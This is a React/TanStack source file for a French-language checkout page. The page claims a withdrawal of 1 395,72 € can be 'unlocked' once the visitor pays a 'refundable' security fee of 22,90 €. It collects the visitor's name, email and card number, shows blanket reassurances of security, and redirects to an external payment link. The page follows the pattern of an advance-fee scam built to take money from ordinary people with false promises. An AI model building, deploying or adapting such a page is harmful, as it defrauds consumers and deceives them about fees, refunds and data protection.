import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { Shield, Lock, CreditCard, ArrowRight } from "lucide-react";

export const Route = createFileRoute("/checkout")({
  head: () => ({
    meta: [
      { title: "Paiement sécurisé | Déblocage du retrait" },
      {
        name: "description",
        content: "Finalisez le déblocage de votre retrait en toute sécurité. Frais remboursables.",
      },
      { property: "og:title", content: "Paiement sécurisé | Déblocage du retrait" },
      {
        property: "og:description",
        content: "Finalisez le déblocage de votre retrait en toute sécurité. Frais remboursables.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: Checkout,
});

const VENDEPAY_CHECKOUT_URL = "https://checkout.vendepay.com/2cd2b8a8-cfcf-4f72-a01f-01d7363cd7a5";

function Checkout() {
  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    cardNumber: "",
  });

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const parts = [];
    for (let i = 0; i < v.length; i += 4) {
      parts.push(v.slice(i, i + 4));
    }
    return parts.join(" ").slice(0, 23);
  };

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData((prev) => ({ ...prev, cardNumber: formatCardNumber(e.target.value) }));
  };

  const handleContinue = () => {
    if (!formData.fullName.trim() || !formData.email.trim() || !formData.cardNumber.trim()) {
      return;
    }
    window.location.href = VENDEPAY_CHECKOUT_URL;
  };

  return (
    <main className="min-h-screen w-full bg-[#f5f5f7] px-4 py-8 text-neutral-900">
      <div className="mx-auto w-full max-w-md">
        {/* Header */}
        <div className="mb-6 flex items-center justify-center gap-2 text-sm font-medium text-neutral-900">
          <Shield className="h-4 w-4 text-emerald-500" />
          Paiement sécurisé
        </div>

        {/* Amount card */}
        <div className="mb-4 rounded-3xl bg-black p-6 text-center text-white shadow-lg">
          <p className="mb-1 text-[11px] font-bold uppercase tracking-widest text-neutral-400">
            Déblocage du retrait de
          </p>
          <p className="mb-1 text-4xl font-black tracking-tight">1 395,72 €</p>
          <p className="text-sm text-neutral-400">
            Frais remboursables : <span className="font-medium text-white">22,90 €</span>
          </p>
        </div>

        {/* Reimbursement details */}
        <div className="mb-4 rounded-3xl bg-white p-5 shadow-sm">
          <h2 className="mb-4 text-[11px] font-bold uppercase tracking-widest text-neutral-500">
            Coordonnées pour le remboursement
          </h2>
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
              <span className="text-sm text-neutral-500">Nom</span>
              <input
                type="text"
                value={formData.fullName}
                onChange={(e) => setFormData((prev) => ({ ...prev, fullName: e.target.value }))}
                placeholder="Votre nom complet"
                className="w-1/2 bg-transparent text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
              />
            </div>
            <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
              <span className="text-sm text-neutral-500">E-mail</span>
              <input
                type="email"
                inputMode="email"
                autoComplete="email"
                value={formData.email}
                onChange={(e) => setFormData((prev) => ({ ...prev, email: e.target.value }))}
                placeholder="vous@email.com"
                className="w-1/2 bg-transparent text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
              />
            </div>
            <div className="flex items-center justify-between border-b border-neutral-100 pb-3">
              <span className="text-sm text-neutral-500">Numéro de carte</span>
              <div className="relative w-1/2">
                <CreditCard className="absolute left-0 top-1/2 h-3.5 w-3.5 -translate-y-1/2 text-neutral-400" />
                <input
                  type="text"
                  inputMode="numeric"
                  value={formData.cardNumber}
                  onChange={handleCardChange}
                  placeholder="0000 0000 0000 0000"
                  className="w-full bg-transparent pl-5 text-right text-sm font-medium text-neutral-900 outline-none placeholder:text-neutral-400"
                />
              </div>
            </div>
            <div className="flex items-center justify-between pt-1">
              <span className="text-sm text-neutral-500">Frais de sécurité</span>
              <div className="flex items-center gap-2">
                <span className="text-sm font-bold text-neutral-900">22,90 €</span>
                <span className="rounded-md bg-rose-500 px-2 py-0.5 text-[10px] font-bold uppercase text-white">
                  Remboursable
                </span>
              </div>
            </div>
          </div>
        </div>

        {/* Bank details section */}
        <div className="mb-4 rounded-3xl bg-white p-5 shadow-sm">
          <h2 className="mb-1 flex items-center gap-2 text-sm font-bold text-neutral-900">
            <Lock className="h-4 w-4 text-neutral-900" />
            Coordonnées bancaires
          </h2>
          <p className="text-sm text-neutral-500">
            Connexion sécurisée et chiffrée — vos données sont protégées.
          </p>
        </div>

        {/* Bottom CTA button */}
        <button
          type="button"
          onClick={handleContinue}
          className="mb-4 flex w-full items-center justify-center gap-2 rounded-full bg-rose-600 py-4 text-sm font-bold text-white shadow-md transition-all hover:bg-rose-700 active:scale-[0.99]"
        >
          Continuar
          <ArrowRight className="h-4 w-4" />
        </button>

        {/* Footer */}
        <p className="text-center text-[11px] text-neutral-400">
          Processus 100 % sécurisé · Référence TT-2026-NYZI0B
        </p>
      </div>
    </main>
  );
}
